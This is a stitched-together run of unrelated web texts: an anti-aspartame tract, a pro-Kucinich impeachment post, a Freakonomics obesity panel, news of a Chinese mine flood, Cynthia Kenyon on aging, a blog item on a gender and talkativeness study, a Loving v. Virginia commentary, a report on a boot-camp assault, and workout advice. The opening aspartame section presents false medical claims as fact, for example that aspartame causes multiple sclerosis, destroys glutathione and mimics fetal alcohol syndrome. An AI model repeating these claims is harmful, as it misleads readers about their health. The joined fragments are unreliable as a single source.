Cellular damage will cause the release of oxidizing agents , resulting in high , free radical exposure that even further damages the nerve cells .
Mitochondrial damage is compounded from this surge in free radical generation .
DIAGRAM #8 :
Multiple Sclerosis ( MS ) is a disease that affects the myelin ( myelin sheath ) , which is the insulation or coating of some of the nerves of the brain , spinal cord , and of the periphery .
Damage has also been identified that affects a part of the nerve fibers called the axons .
Oligodendrocyte damage and cell loss also occurs .
Nerve cell damage takes place within the " white matter " of the brain , where the neurons have myelin sheaths , giving this part of the brain its color .
Demyelination of the central nervous system ( white matter ) are hallmarks of this disease .
This is normally ( but not always ) accompanied by optic neuritis , asymmetrical muscle weakness , or fatigue .
Evidence seems to point to an immunological disorder , as a response to an inflammatory process in the brain ( and / or spinal cord ) .
Although many scientists have not identified a definitive cause of Multiple Sclerosis , many hypothesize that MS may be of a triggered immunological origin .
These authors ' investigative research into known scientific endeavors , biochemical facts , and available data , leads to the following deduction .
Hopefully , this will prompt further investigation into the etiology of MS by non-industry funded researchers .
IF MS is an " immunological " response , then the following need be considered :
A reduction in glutathione synthesis will impair antioxidant defenses .
Glutathione is virtually eradicated ( not available ) following the ingestion of aspartame and its resulting metabolic reactions .
T - Cells ( immune response cells ) are dependant upon intracellular glutathione , Functionality of the T - cells is impaired during this period .
Deamination results from methanol toxicity --> formaldehyde --> formic acid and can be highly mutagenic for nucleotides , DNA , RNA transcription processes .
Pharmaceutically manufactured isolates ( alone or in concert with additional excitotoxic food additives / environmental toxins ) creates an excitotoxic response to include :
increased cell damage from oxidation ,
mitochondrial damage ( incl. a reduction in available ATP ) ,
imbalance of inter / extracellular amino acids and their precursors ,
increased intracellular Ca + or disruption of gated processes ,
release of damaging free radicals ,
excessive nitric oxide ( NO ) production ,
displacement / release of free iron within the brain ,
mutagenic effects from formaldehyde or generalized cellular DNA mutations ,
subsequent inflammatory response as a result of this cellular damage Evidence reveals that Methanol has long been the agent most well know to cause auto - immune antibodies to " attack " the pancreas and myelin sheaths of neurons .
The structures damaged in MS are the white fibers of the CNS .
These structures are in intimate contact with the cerebral spinal fluid immediately after the fluid is formed by the Choroid Plexus .
Therefore , the white matter receives massive doses of dicarboxylic amino acid neuro - excititoxins which are delivered to the brain from the CSF .
In some cases , the immune system itself may have been damaged by the formaldehyde 's mutagenic effects or affected by brain chemistry / enzyme changes , creating a flawed system .
This could cause the body to attack and catabolize its own nerve ( or other ) cells .
Destroyed neurons will eventually be absorbed , leaving lesions or holes where they once had been .
Abstinence from aspartame appears to relieve the clinical presentation of excitotoxic - induced MS .
This immune process defect may ( in part ) also explain the rise in cross-chemical sensitivity syndrome .

Furthermore , during maternal aspartame consumption , development of the fetal nervous system is damaged or impaired via excitotoxic - saturated placental blood flow that can cause or contribute to cerebral palsy and pervasive developmental disorders , such as discussed here .
This is due to an incompetent blood brain barrier and neuronal ( brain ) damage produced by excitotoxins circulating the fetal brain areas .
This is especially true for those areas adjacent to the brain 's ventricular system .
There is no doubt that destruction or damage of the hypothalamus and corresponding neuro - endocrine organs , leads to potential developmental complications ( physical and mental ) .
Additionally , fetal alcohol syndrome can be mimicked through the methanol components of aspartame , and is a direct result from the maternal ingestion of aspartame .
Other disorders of fetal neurotoxin exposure will show up after birth , in the form of patho - physiologically induced learning and behavior disorders , attention deficit disorders , and the potential of DNA structural mutagenisis from formaldahyde concentrations , adducts , and the accompanying excitotoxic damage .
_________________________
Of Special Note :
During the production of aspartame , none of the animal studies conducted revealed the true neurotoxic nature of this poison in humans .
That means that the studies were design - flawed from day one .
A successful pharmaceutical firm , and seasoned intelligence or research personnel do not overlook this type of testing application by accident .
It is evidenced that , even with the relatively lower doses used during initial testing , many of these test animals still became sick or died as a result of ingesting aspartame .
Prior to the development of aspartame , it was a well known fact that phenylalanine interfered with human brain chemistry and had once been considered as a chemical warfare agent due to its neurotoxic capabilities .
Physiologically , human beings are approximately 60 times more sensitive to phenylalanine toxicity than any of the animals tested .
Furthermore , humans are 10 - 20 times more sensitive to methanol poisoning both as a subchronic and chronic toxin / carcinogen .
On the contrary , the animals studied are more sensitive to the more common ethanol found in alcoholic beverages due to differences in enzyme concentrations of the species .
Humans are also about 8 - 10 times more sensitive to the affects of aspartic acid and glutamates , than the test animals being used .
__________________________________________________
NOTE :
A new sweetener known as Neotame has chemical properties of known toxicity to man .
Neotame appears to be a chemically altered " aspartame " , possessing similar proportionate neurotoxic qualities .
I suspect the new name was formed to superficially distance this product from aspartame , due to the symptoms generated and because of the publicity this poison has received .
Additionally , we should note that our public health agencies , as well as our regulatory policies , are in severe need of reorganization , to put it mildly ...
All evidence substantiates that aspartame is a powerful neurotoxin .
Further investigation is absolutely warranted .

Kucinich introduced articles of impeachment against Vice President , Dick Cheney , back in April .
H.R. 333 consists of three articles of impeachment , with supporting examples :
1. ) In his conduct while Vice President of the United States , Richard B. Cheney , in violation of his constitutional oath to faithfully execute the office of Vice President of the United States and , to the best of his ability , preserve , protect , and defend the Constitution of the United States , and in violation of his constitutional duty to take care that the laws be faithfully executed , has purposely manipulated the intelligence process to deceive the citizens and Congress of the United States by fabricating a threat of Iraqi weapons of mass destruction to justify the use of the United States Armed Forces against the nation of Iraq in a manner damaging to our national security interests 2 . )
In his conduct while Vice President of the United States , Richard B. Cheney , in violation of his constitutional oath to faithfully execute the office of Vice President of the United States and , to the best of his ability , preserve , protect , and defend the Constitution of the United States , and in violation of his constitutional duty to take care that the laws be faithfully executed , purposely manipulated the intelligence process to deceive the citizens and Congress of the United States about an alleged relationship between Iraq and al Qaeda in order to justify the use of the United States Armed Forces against the nation of Iraq in a manner damaging to our national security interests 3 . )
In his conduct while Vice President of the United States , Richard B. Cheney , in violation of his constitutional oath to faithfully execute the office of Vice President of the United States and , to the best of his ability , preserve , protect , and defend the Constitution of the United States , and in violation of his constitutional duty to take care that the laws be faithfully executed , has openly threatened aggression against the Republic of Iran absent any real threat to the United States , and done so with the United States proven capability to carry out such threats , thus undermining the national security of the United States
Kucinich also provided roughly 50 supporting documents for the articles , on his Congressional website .
Over 80 cities / towns have now passed impeachment resolutions , with 50 more pending , and major polls , such as Zogby , have indicated a majority of Americans support impeachment proceedings .
However , the MSM and members of Congress have failed to listen to the American people .
H.R. 333 has picked up 21 cosponsors , far short of what is needed to start proceedings , and House Speaker Pelosi has continually insisted that impeachment is " off the table " .
But , as Kucinich holds nothing higher than his duties to defend the Constitution and represent the people of the United States , Kucinich is making sure that it gets back on .
when asked about the Congress ' failures to protect the Constituion , at the San Mateo Presidential Straw Poll , Kucinich replied :
" If Congress did the right thing , they would be talking ... about impeachment ...
" I introduced House Resolution 333 because I heard from the American people and they said they wanted some response to make Dick Cheney accountable for the statements that he made that took us into a war based on lies .
And the statements he made that would take us into a conflict against Iran .
Again , more lies .
" The President is now openly invoking the specter of World War III with respect to Iran .
He ought to be held accountable also .
I 'm the only member of Congress who stepped forward on the issue of making Dick Cheney accountable .
And now we have 21 members who 've joined me .
That 's a step in the right direction .
But I 'm going to go beyond that .
I 'm going to call a privileged resolution , at which point , would force a vote --- at least if it 's only on a procedural motion --- members are going to have to confront this issue of impeachment .
They 're not going to escape it .
This is a question of defending our Constitution .
It really is . "
Kucinich proves yet again his courage and leadership in Represntative Democracy against fear and political calculation .
He proves that he will not play party politics if it is against the interests of the United States and American citizens .
He proves , again , his credentials for holding our highest office .
Support Dennis Kucinich !
Freakonomics Quorum : What is the Right Way to Think About the Obesity ‘ Epidemic ’ ?
If you rely on nothing but the media for your information , you might think that obesity is the new Black Plague , laying to waste huge swaths of the population .
But is it ?
We ’ve blogged more than a few times about the spike in American obesity .
These posts have included : economists ’ attempts to identify the causes of this spike ; a post wondering if high gas prices might lead to skinnier Americans ; and an attempt to generally get a grip on what obesity is and how much it matters .
With the public and media still fixated on obesity , I thought it might be worthwhile to take a step back and put an incredibly basic question to a variety of people who spend a lot of time thinking about the subject :
What is the right way to think about the American obesity “ epidemic ” ?
This round of questioning has come to be known as a Freakonomics Quorum , with recent discussions on street charity and the housing market .
Here are the participants for the discussion on obesity :
J. Eric Oliver , a professor of political science at the University of Chicago and author of Fat Politics : The Real Story behind America ’s Obesity Epidemic ; David Cutler , a former member of the National Economic Council who is now a professor of economics and a dean of social sciences at Harvard ; Dr. Darwin Deen , a professor of family medicine at the Albert Einstein College of Medicine and co-author of Nutrition for Life and The Complete Guide to Nutrition in Primary Care ; Dr. Lisa Hark , the director of the University of Pennsylvania School of Medicine ’s Nutrition Education and Prevention Program , co-author of Nutrition for Life , and former host of TLC ’s Honey We ’re Killing the Kids ; Matt Verbin , founder of the Obesity Forum , an encyclopedic online source of obesity studies and programs ; and David Zinczenko , the editor - in - chief of Men ’s Health magazine and author of the Abs Diet series .
J. Eric Oliver :
We hear a lot in the media these days about America ’s obesity epidemic .
A third of Americans , we are told , are “ obese , ” and two - thirds are “ overweight . ”
Hundreds of thousands purportedly are dying each year from weighing too much , while countless others suffer from scores of “ obesity related ” diseases .
Obesity has been blamed for everything from dragging down the economy to global warming .
Most recently , we ’ve heard that obesity is “ contagious . ”
The problem with these assertions is that they are based mostly on arbitrary definitions and fuzzy statistical conjectures .
Although Americans have indeed grown heavier over the past three decades ( the average American weighs about 8 to 12 pounds more than in 1980 ) , it is not clear that this weight gain is putting them in any imminent danger .
The primary reason so many Americans are “ overweight ” and “ obese ” is because these terms are defined at unjustifiably low levels of body mass .
For example , under our current definitions , George Bush and Michael Jordan are overweight , while Arnold Schwarzenegger and Mel Gibson are obese .
These standards were not based on any scientific evidence linking body mass to health , but were created by insurance actuaries and medical professionals with financial ties to the weight loss industry .
Similarly , the idea that obesity is itself a disease or causes disease is based largely on correlations in large epidemiological studies , not on any clear causal link between excess weight and disease .
With the exception of a few minor conditions ( like osteoarthritis ) , we do n’t have any good evidence that adiposity causes any physical harm .
By the same statistical criteria used to call obesity a disease , one could also claim that being male , being overly tall , or even being black is a disease ( i.e. , all correlate with early mortality and morbidity ) .
The fact that we choose to demonize fatness rather than these other traits illustrates how concerns about obesity are rooted far more in political and cultural standards than scientific ones .
In short , the biggest problem with all the hype about the obesity epidemic is that it assumes that :
A ) weight is a good barometer of health ( it is n’t ) ;
B ) being thin is the same as being healthy ( it ’s not ) ;
C ) anyone can be thin if they want to ( which is not true ) .
In the absence of any safe or effective weight - loss mechanisms , telling Americans they need to be thinner only encourages them to embrace unhealthy and unworkable diet plans .
Arguably , prejudice and discrimination against fatness cause far more adverse health outcomes than the fat itself .
Rather than worry about how fat our country is , we should be asking ourselves why we are so judgmental about how much other people weigh .
David Cutler :
As I write this in my office , a soda machine is not more than 20 steps away .
Candy is practically within reach .
In less than two minutes , I can walk to pizza , hamburgers , ice cream , muffins , bagels , cookies , and tacos ( all in separate stores ) .
Technology has brought us a wealth of good things ; the computer on which I write this was undreamed of a generation ago .
But easy access is one downside of progress .
It takes all my energy not to eat chocolate continuously .
And I love ice cream .
Some of us develop rules .
I do n’t drink caffeinated drinks — no obvious reason why , but that ’s the rule .
Chocolate is never eaten before lunch .
I do n’t get ice cream at work .
Through these measures , I manage to keep my weight in check .
But the rules are hard to keep .
Technology is what allows us to be fat .
The inability to discipline ourselves is why we let it happen .
The fascinating thing about progress is that it can be both good and bad .
The discovery of nuclear fusion allows for cheaper , more environmentally friendly forms of energy .
But it also allows for nuclear weapons .
A generation ago , women spent an average of two hours per day cooking and cleaning ; today , the cooking and cleaning is handled by a restaurant or food company .
Weight gain is the consequence .
One of two measures will be needed to end the obesity epidemic .
Technology might progress to where we can mass produce non -fat food as readily as fat food .
Today ’s cookies taste better than those of a few decades ago ; apples are the same .
Maybe a new kind of apple will be invented that has us rushing to the fruit store .
Alternatively , we will have to discover the willpower to allow us to use technology only in moderation .
I sometimes toy with a solution — maybe I should set aside $ 10 every week , which I get back at the end of the week if I do n’t eat anything bad for me .
We do this with saving ( think Christmas clubs ) .
Can widespread use of such a strategy for eating be far behind ?
Or maybe progress will march along , and we will continue to get fat .
In that case , we ’ll develop and expand medical technology that treats the consequences of obesity — drugs for diabetes and high cholesterol ; hip and knee replacements ; new arthritis medications .
All of those are expensive , but maybe the tradeoff for ice cream is worth it .
Dr. Darwin Deen :
An “ epidemic ” is defined by epidemiologists ( who specialize in the health of populations ) , as a disease occurring at a greater frequency than expected .
While the definition that we use for obesity has changed and our ability to measure body fat has become more sophisticated , there is no doubt that we are heavier than we were 20 or 30 years ago , and that this change will have the most dramatic health impact on our children .
It is alright to gain some weight as you get older ( in fact , in middle age it is probably healthier to be overweight than to be thin ) , but people who are 50 - 100 pounds above the average weight for their height are at greater risk for diabetes , heart disease , and cancer .
I am avoiding talking about BMI ( body mass index ) even though it is the way that physicians and researchers classify weight , as it is not that helpful when assessing an individual .
What is more important for adults is belly fat .
The reasons for this increase in the number of people who are overweight are debatable , but one need only review the increases in typical portion sizes ( I am 50 years old and still remember small glass Coke bottles and 3 oz .
McDonald ’s fries ) to understand that we are eating more than we ever did .
While exercise is an important part of staying healthy , the obesity epidemic has developed at a time when we have not started exercising any less ( reductions in caloric expenditure — the calories that we burn through activity — are less now than they were 100 years ago , when everyone worked with their hands , but not less than they were 30 years ago , when the interstate and the office job were already the norm ) .
So the right way to think about the obesity epidemic is that , in order to make sure you do n’t suffer the medical consequences of obesity , you should eat a healthy diet ( fruits , vegetables , whole grains , low fat dairy products ) , avoid “ excess ” calories ( cakes , cookies , large portions , feeling “ stuffed ” except for occasionally ) , and get regular exercise .
If any of this is confusion to you , there are plenty of articles and books on the subject ( I ’ve written two myself ) ; and , while most doctors have very little nutrition training , your doctor is absolutely the best person to tell you if your weight or lifestyle presents a hazard to your health .
Dr. Lisa Hark :
When I think about the obesity epidemic in America , I become very concerned with the current and future health of our entire society .
America is known as the cradle of liberty , a place where people who work hard can succeed , make something of themselves , and live their dream life .
But now , Americans are gaining worldwide notoriety for being the fattest country on Earth , home to more than 65 million overweight people .
And it ’s not just a cozy , “ more of you to love ” situation .
Obesity and the conditions it causes — heart disease and diabetes , to name two — are responsible for almost 1 million deaths every year .
And now our kids are experiencing the side effects .
Rates of obesity in children are at an all - time high .
For the first time in history , this generation of children is not expected to live longer than their parents .
Rich , industrialized America is poised to experience a drop in life expectancy , all because we ’re eating too much and we are n’t active enough .
So what ’s the answer and the right way to think about obesity in America ?
My focus is on the family , and helping parents and kids .
As parents , we need to step up and take responsibility for making sure our kids get the foundation that they need to lead healthy and active lives , now and in the future .
Unfortunately , we have become a society obsessed with TV , and kids are learning this at a very young age .
Experts now agree that screen time of all types needs to be limited for children and teenagers to less than two hours per day .
I believe the less TV our kids watch , the healthier they will be .
Studies show that the more children are exposed to TV ads for junk food and sweetened drinks , the more likely they are to consume large amounts of unhealthy food .
We need to avoid putting TVs in our children ’s bedrooms and start monitoring how much and what they are watching .
This also includes computer and video game time .
Children spend most of the school day sitting , so get them outside for some play time after school , and use weekends for active family bonding outings .
We also need to get back to basics and eat meals together as a family as many nights as we can .
We must incorporate fruits and vegetables into all meals and snacks , offer water and low - fat milk instead of sweetened drinks , and get out and be active with our kids in fun and inviting ways .
After school is a great time to get children to eat vegetables because they are so hungry .
Try baby carrots , cut up cucumbers , peppers , tomatoes , or celery with low - fat ranch or French dressing .
Offer fresh and canned fruit to satisfy cravings for desserts and sweets .
Do n’t rely on school lunch options .
Pack a healthy lunch at least 3 times a week , along with a water bottle and fresh fruit .
Being healthy role models for our children is critical if we expect them to eat healthy and be active .
And remember , it ’s OK to say “ no ” to children when it comes to TV and unhealthy foods and drinks .
If we are n’t firm in this area , advertising , peer pressure , and a plain old sweet tooth will override all of our good intentions .
Matt Verbin :
Obesity is a multi- faceted disease fueled by Americans ’ poor eating habits , complacency and sedentary lifestyles .
While the physical and emotional impact of obesity on a growing number of Americans is glaring , what truly makes obesity an epidemic is the economic impact it has on all of us .
People underestimate the economic effect obesity has on our society .
The Center for Disease Control has concluded that illnesses associated with obesity cost the United States $ 93 billion a year in health care costs .
Eric Finkelstein , a health economist at the nonprofit RTI Institute , wrote , “ about half of the total cost of obesity - related health care is paid by the government through its Medicare program .
For every American citizen , the out - of - pocket tax cost is an average $ 180 . ”
This dwarfs the $ 13 billion businesses lose each year from obesity - related medical fees , absenteeism , and decreased productivity ( as reported by the National Business Group on Health ) .
Many of these obesity - related business costs are passed down to consumers in the form of more expensive goods and services .
Obesity , like many diseases , has no simple cure that alleviates its negative consequences .
The government ’s increased involvement and spending on health education , research and obesity programs , combined with our desire as a society to lead a healthier lifestyle , are the driving factors towards finding a solution .
The question is , do we invest a lot of time and money fighting obesity now , or pay an even higher price down the road ?
David Zinczenko :
A lot of people blame the obesity epidemic on lack of physical exercise , but I ’m just not sold .
The real rise in obesity started in the 1960s and 70s , and life was n’t radically different between 1950 and 1970 — it ’s not as though we were all working as farmers in 1950 and suddenly became sedentary in the seventies .
( In fact , you can argue that we walked / cycled / ran / skied far less in 1950 than we do today , since the growth of the fitness industry . )
Our lifestyles might be somewhat different now , but one thing is radically different : our food .
Starting in the 70s , manufacturers began to pump sugars into their packaged products , and the advent of high fructose corn syrup ( HFCS ) has only exacerbated our collective sweet tooth .
HFCS has proven so irresistible to manufacturers because : a ) it ’s highly subsidized by legislation like the farm bill , which makes it cheap ; and b ) it ’s a highly refined , stable liquid , which means it has a longer shelf life than table sugar and can blend seamlessly into products you would n’t associate with sugar — ketchup , for example , or marinara sauce .
It ’s no surprise , then , that we now consume 200 calories a day more than we did in 1970 , and most of that comes from added sugars .
By some accounts , we now consume up to 75 pounds of HFCS a year , and you ’re likely to find it listed in the top three ingredients on the nutrition labels of products that simply were never intended to be sweetened — wheat bread , salad dressing , and crackers , for example .
As far as hydrogenated oils go , the sad irony is that they were created to replace the evil saturated fat , yet the trans - fats that came as a result seems to be far worse .
Sure , some food manufacturers have taken strides to change ( McDonald ’s , Wendy’s , Subway , Frito Lay , and Nabisco , for example ) , but others are n’t even attempting to make the switch : each Keebler cookie has two grams of trans fats , while a chicken pot pie at KFC has a punishing 14 grams of the stuff .
This , in turn , is wreaking havoc on our waistlines , and our tickers .
Another way to look at it is that our bellies are growing in direct relation to the both the size of the ingredient lists on our packages ( it ’s rare to come across one that does n’t require a degree in chemistry to understand ) , and to the increase in restaurant and fast food portion sizes .
Studies have shown that the average size of a dinner plate has grown 36 % since 1960 , while over the same period , the impact of your average - size McDonald ’s french fries order has swollen from 200 calories to 600 calories .
All of this — the unpronounceable ingredients , the behemoth portions , the stealth additives — works to confound our expectations about what our food will ultimately do to our bodies , which explains why we ’ve become so clueless about estimating our caloric intakes .
Two studies are particularly illustrative :
1 ) A University of Arkansas study found that people underestimated the number of calories in restaurant meals by as much as 600 calories .
2 ) And at Cornell , 85 grad students and nutrition scientists underestimated their ice cream servings by as much as 40 percent .
If experts ca n’t gauge what they ’re putting in their bodies , how can the average American be expected to ?
Miners ' families say they have been given little information
Torrential rain had caused a river to burst its banks , sending flood water cascading down an old shaft into the mine where the men were working .
Rescuers are desperately trying to pump the water out but the chances of finding anyone alive appear slim .
Chief rescuer Zhu Wenyu said he thought the miners had no hope of survival .
The main mine affected , where 172 miners are missing , was completely inundated and many of the missing appear to be stranded far below the surface .
Nine other miners are also trapped at a nearby pit .
These accidents are a reminder that Chinese coal mines are among the most dangerous in the world , the BBC's Michael Bristow reports from Beijing .
Desperate protest
The breach in the dyke on the River Wen was finally closed on Sunday and pipes and high - speed pumps have been installed , state media report .
Continuing rain has frustrated rescuers ' efforts at the mine
Rescue teams
Shandong 's Communist Party chief , Li Jianguo , called for " no efforts to be spared " during the rescue work , according to state radio .
Distraught relatives of the missing miners have been demonstrating outside the Huayuan Mining Company in Xintai City , 450 km ( 280 miles ) south of Beijing .
Yelling abuse at guards , they tried to push their way through barriers after being refused access to the main flooded mine , and demanded that journalists be allowed to investigate properly what had happened .
Ren Hua , whose husband is one of those trapped , told The Associated Press that she had been called on Friday and told there was no problem and that water was being pumped out of the mine .
But when she arrived on Saturday with her 11 - year - old son she found the pumping had not started .
" We want to know how much work has been done and whether they are drawing off the water , " she added , weeping .
When the mines became flooded on Friday , amid flash floods brought on by rainfall of about 205 mm , 584 miners managed to escape .
Professor Cynthia Kenyon is a pioneering researcher in the biology of aging .
A couple years ago , she presented a Harvey Lecture at Rockefeller University on her work ; that lecture was similar to the one I heard her give at last year ’s Woods Hole summer school course on aging .
I think that it ’s worth highlighting some of the things she has to say .
“ We began our studies in the early 1990s .
At that time , and for years before , many people assumed that aging was a haphazard process , not subject to regulation .
Our tissues just break down , and we die .
But the more I thought about it , the more I started to question this view .
A mouse lives two years , whereas a bat can live 30 years or more .
A rat lives three years ; a squirrel , 25 .
These animals differ by their genes , so there must be genes that affect aging .
Also , nothing in biology seems to “ just happen ” ; everything seems to be regulated , often in quite an extraordinary way .
My experience as a developmental biologist sharpened my thoughts about aging .
People were once very skeptical about looking for developmental genes .
Treating frog embryos with acid can produce a second head , and inhibiting pyrimidine synthesis in flies produces small wings , so many people thought that genes affecting development would also affect things like the Krebs cycle , or pH .
They were wrong .
There is a dedicated regulatory circuitry for pattern formation .
In addition , many people thought that developmental mechanisms would differ completely in different kinds of animals , but again they were wrong .
In fact , the degree of evolutionary conservation is striking .
So it seemed to me that something as fundamental as aging might also be subject to regulation .
Maybe there would be a molecular longevity “ dial , ” like a thermostat , that is universal but set to run at different rates in different kinds of animals .
The dial would be turned up in mice ( which age quickly ) and down in bats ( which age slowly ) .
I wrote extensively about this in the 1990 ’s ( Kenyon , 1996 , 1997 ) , suggesting , for example , that aging might be regulated by something like the heterochronic genes of C. elegans , which control the timing of developmental events . ”

“ Since we obtained such a long lifespan when we killed the gonads of daf - 2 mutants , we wondered what would happen if we reduced daf - 2 activity even more in these animals .
Using a stronger daf - 2 allele would run the risk of triggering dauer formation , but we found that we could dodge dauer formation if we subjected long - lived daf - 2( e1368 ) mutants to daf - 2 RNAi soon after hatching .
When we did this , and killed the gonads as well , the animals lived six times as long as normal ( Fig. 2.16 ) .
Incredibly , the animals remained healthy and vigorous for a very long time .
In fact , when Nuno Arantes - Oliveira , the graduate student doing this work , showed two 144 - day - old animals , still moving around , to other lab members and asked them to guess the age of the animals , they reckoned five days !
[ For a movie of these two spunky animals , see Arantes - Oliveira et al. ( 2003 ) . ]
It is remarkable that with just a few minor changes , it is possible to produce such an enormous lifespan extension ( the equivalent of 500 years in humans ) with no obvious effect on the vitality of the animals . ”
…
“ If we really could live longer , remaining youthful and disease - free , why have n’t scientists been working on this already ?
First , as I said , they did n’t think it was possible , since aging was thought to be unruly and random .
Second , and even more important , we have n’t had any role models to emulate , primates that shoot rockets to the moon , go to the opera , and live for 300 years .
If we did , we might already know how to stay young and live much longer than we do .
We invented airplanes because we could see birds could fly .
Now that we know that animals can live longer than they do , perhaps soon we will learn how to extend our own youthfulness and lifespan .
It may not be that difficult .
Since there are short - lived and long - lived insects , birds , and mammals , longevity must have evolved not just once but many times .
Maybe the path to increased longevity is in us already , in the form of a network of genes and proteins , waiting to be nudged in just the right way . ”
I recommend you read the whole thing–it ’s quite readable , and the scientific results are breathtaking .
And if you ’re interested , here is a video from earlier this year with Charlie Rose interviewing a panel of biologists about the remarkable progress that has been made in aging research recently .
Members of the panel include Kenyon and Lenny Guarente , another leader in the field whose book I previously reviewed .

Though the accepted stereotype of a nonstop talker is always that of a nattering old biddy , a new study shows that men actually talk more than women on the whole .
But while men are more gabby overall , the level of talkativeness is largely situational : According to an article in the November issue of the Personality and Social Psychology Review , " The researchers discovered that , with strangers , women were generally more talkative when it came to using speech to affirm her connection to the listener , while men's speech focused more on an attempt to influence the listener , " which is a fancy way of saying that women like feelings while men are into power .
Groundbreaking !

Though Melanie Ayres , a co-author of the study , asserts that the findings " compellingly debunk simplistic stereotypes about gender differences in language use , " it seems more like the study is reinforcing gender stereotypes instead of breaking them down .
Ayres does conclude , however , that use of language is more of a social than a biological construct , so perhaps if women were encouraged to use language to influence others rather than emotionally connect with them , we would n't always be portrayed as frivolous gossips .
Regardless , I can't tell you how many times men have told me that I 'm being " loud " when I vehemently express an opinion .
Have you ever heard anyone tell a man that he needs to quiet down ?

Forty years ago today , the U.S. Supreme Court issued it ’s decision in what may well have been the most ironically named lawsuit in history .
The Plaintiffs were Richard and Mildred Loving .
A couple who had been married in the District of Columbia in June 1958 .
And that ’s where the trouble started .
You see , Richard was white and Mildred was black .
And in Virginia in 1958 , that just was n’t right .
In fact , they had deliberately gone to D.C. to get married and then returned to their home in Virginia .
The only problem is that interracial marriages were illegal in Virginia in 1958 , and evading the ban was a criminal offense that could lead to jail time .
And that ’s what happened to the Lovings .
Not surprisingly , the state courts of Virginia upheld the conviction .
Which left it to the United States Supreme Court to decide whether Virginia ’s “ public policy ” ban on interracial marriages violated the 14th Amendment .
Fortunately , they reached the right conclusion :
Marriage is one of the “ basic civil rights of man , ” fundamental to our very existence and survival … .
To deny this fundamental freedom on so unsupportable a basis as the racial classifications embodied in these statutes , classifications so directly subversive of the principle of equality at the heart of the Fourteenth Amendment , is surely to deprive all the State ’s citizens of liberty without due process of law .
The Fourteenth Amendment requires that the freedom of choice to marry not be restricted by invidious racial discriminations .
Under our Constitution , the freedom to marry , or not marry , a person of another race resides with the individual and cannot be infringed by the State .
Okay , so here ’s the question .
Take the above quote , heck take the entire Loving v. Virginia opinion , and substitute race for gender and tell me why state laws against homosexuals being allowed to marry should be considered valid .
Yea , I did n’t think you could .
H/T to fellow Virginian Vivian Page for reminding me of the anniversary of this decision .

2 accused of dragging girl behind van at camp Pastor accused of dragging girl behind his van
A trainer also faces charges in incident at boot camp
A San Antonio pastor and an employee of his Christian boot camp were arrested Friday on aggravated assault charges , accused of dragging a girl behind a van after she failed to keep up during a running exercise .
Investigators with the Nueces County Sheriff 's Office arrested Charles E. Flowers , 46 , shortly before noon at the Faith Outreach Center in northwest San Antonio , said Brad E. Bailey , a spokesman for the Schertz Police Department .
Bailey said boot camp trainer Stephanie Bassitt , 20 , was later arrested without incident at her home in Kirby .
Flowers and Bassitt each were being held on $ 100,000 bail at the Nueces County Jail in Corpus Christi .
Girl alleges second assault
Authorities said both Flowers and Bassitt restrained the girl June 12 , tying her to the back of a van with a piece of rope before dragging her on her stomach at the Love Demonstrated Ministries ' boot camp in Banquete , about 10 miles west of Corpus Christi .
Schertz police assisted Nueces County authorities in the arrests because the camp 's orientation sessions are held in Schertz , and the 15 - year - old girl claimed she was assaulted there , too .
Bailey said the second assault claim was turned over to the Comal County district attorney 's office , which has n't said if any criminal charges will result .
He said the assault described as having occurred in Schertz is n't as severe as the dragging claim out of Nueces County .
" Obviously force was used , but the big question is whether or not it exceeded the force permitted by the parents , " Bailey said , adding camp officials said they had permission slips from parents that allowed them to discipline their children .
Flowers declined to comment on the allegations Friday , evading reporters outside the offices of the Faith Outreach Center .
Scrapes and bruises
Authorities interviewed on Friday could not say how far the teenager was allegedly dragged .
Her mother complained to authorities after boot camp personnel took her daughter to get treated for scrapes and bruises on her stomach , legs and arms .
Flowers , a retired U.S. Air Force instructor , holds the title of commandant of the boot camp he has operated with his wife , Janice , since the mid-1990s , states the camp 's Web site .
The camp was created to " reinstill the values that have been lost in our society for a couple of generations , values such as discipline , morality , unity and integrity . "
Exempt from regulation
Last year , Love Demonstrated Ministries reported private and government contributions totaling $ 314,673 to operate the boot camp , with nearly 89 percent of the costs , $ 278,549 , going for salaries .
Associate pastors at the Faith Outreach Center could n't be reached for comment Friday .
Patrick Crimmins , a spokesman for the Texas Department of Family and Protective Services , said it " appeared that this operation is probably exempt from our regulation . "
He said for a camp to be licensed , it needed to operate longer than 11 weeks .
The camp in Nueces County only lasts 32 days .

One of the fun parts of being a trainer and having a day job is that you give out a lot of free advice to coworkers –maybe 10 % of which actually gets listened to .
I was talking with a coworker yesterday who was asking me how to revamp his workout , since it was getting stale .
It turns out he was lifting upper body only ( strike one ! ) , five days a week ( strike two ! ) , on machines only ( strike three ! ) .
After telling him his workout needed scrapping , not revamping , he trotted out my favorite excuse for a crappy workout :
“ I do n’t want to get too big–no offense , but like you . ”
I ’ll admit that at 210 pounds on a 5 ’ 6 ″ frame , I ’m bigger than a lot of people want to get .
I ca n’t buy a suit off the rack , and there are stores where I do n’t bother even looking at the pants .
I buy the baggiest jeans Levis makes ( 569s or 570s ) because they fit like , well , jeans .
However , I did n’t wake up one morning at 210 .
I lifted aggressively , ate aggressively , and slept aggressively to get here .
I ate when I was n’t hungry .
I set the alarm on my watch to remind me to eat .
I tried training like a powerlifter .
I tried training like a strongman .
I limited my cardio .
I napped after work .
In short , I did everything short of taking steroids or growth hormone to get big .
And this guy is telling me he does n’t want to train intelligently because he ’s worried he might accidentally get big .
I pointed out politely that I had worked my ass off to get big .
That most people never build as much muscle as they ultimately want .
That if by some miracle you do build the body you want , you just have to shift your food intake and training to maintenance .
He was n’t buying it .
And that ’s when it hit me : he was looking for an excuse not to train his whole body , hard , with free weights , three times a week .
Most people are actually like this .
Ronnie Coleman famously said “ Everybody wants to be a bodybuilder , but nobody wants to lift no heavy - ass weight . ”
People do n’t want to admit that they ’re afraid of the pain of lifting heavy , so they shift the discussion to aesthetic terms : I do n’t want to get too big .
I ’m here to call BS on that excuse , once and for all .
By lifting and eating intelligently , you ’ll never get too big .
You ’re always in control of how big you get .
What you will do is dramatically improve your physique and your athletic performance .
Sure , it takes hard work .
Sure , it ’s going to hurt sometimes .
Sure , it ’s going to suck .
But if it does n’t hurt and suck , it ’s not doing you any good .
A simple hurt - and - suck workout that will get results goes as follows :
Workout A
Squat
Bench Press
Bent - Over Row
Arnold Press
Barbell Curl
Calf Raise
Workout B
Deadlift
Incline DB Press
Chin-Up
Standing Press
Incline DB Curl
Hanging Leg Raise
Alternate workouts A and B , working out a total of three nonconsecutive days a week .
Three sets of eight should be about right , given that the final rep of the final set is an all - out effort or very close to it .
You wo n’t get too big , but you just might make the best progress of your life .
